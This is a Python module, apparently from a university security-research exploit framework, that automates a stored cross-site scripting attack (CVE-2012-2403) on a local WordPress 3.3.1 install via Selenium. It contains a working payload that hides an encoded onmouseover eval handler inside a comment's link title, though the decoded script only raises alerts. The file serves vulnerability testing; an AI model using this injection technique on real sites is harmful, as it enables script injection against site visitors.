
# Copyright 2013 University of Maryland.  All rights reserved.
# Use of this source code is governed by a BSD-style
# license that can be found in the LICENSE.TXT file.


import framework

from selenium.common.exceptions import NoSuchElementException


class Exploit (framework.Exploit):

    attributes = {'Name' :        "CVE_2012_2403",
                  'Description' : "Creates a post containing a XSS payload.",
                  'References' :  [['CVE','2012-2403'],['http://www.osvdb.org/show/osvdb/81463']],
                  'Target' :      "Wordpress 3.3.1",
                  'TargetLicense' : '',
                  'Type' :        "XSS",
                  'VulWikiPage' : "http://seamster.cs.umd.edu/vulwiki/index.php/CVE-2012-2403"
                  }

    def __init__(self, visible=False):
        framework.Exploit.__init__(self, visible)
        self.verified = False
        return
            
    def exploit(self):

        payload = "<a href=\"#\" title=\"XSS http://example.com/onmouseover" \
                  "=eval(unescape(/%61%6c%65%72%74%28%31%29%3b%61%6c%65%72%" \
                  "74%28%32%29%3b%61%6c%65%72%74%28%33%29%3b/.source))//\">" \
                  "XSS</a>"

        driver = self.create_selenium_driver(javascript=False)
        
        driver.get("http://localhost/wordpress/?p=1")
        self.logger.info("Page opened successfully: %s", driver.title)

        driver.find_element_by_id("author").clear()
        driver.find_element_by_id("author").send_keys("selenium script")
        driver.find_element_by_id("email").clear()
        driver.find_element_by_id("email").send_keys("selenium@python.org")
        driver.find_element_by_id("url").clear()
        driver.find_element_by_id("url").send_keys("www.python.org")
        driver.find_element_by_id("comment").clear()
        self.logger.info("uploading payload: %s", payload)
        driver.find_element_by_id("comment").send_keys(payload)
        driver.find_element_by_id("submit").click()
        
        try:
            driver.get_element(by_xpath="//a[contains(@onmouseover,'eval')]")
            self.verified = True
            self.logger.info("XSS success")
        except NoSuchElementException:
            self.logger.error("XSS failed")
            
        
        driver.cleanup()
        return


    def verify(self):
        return self.verified
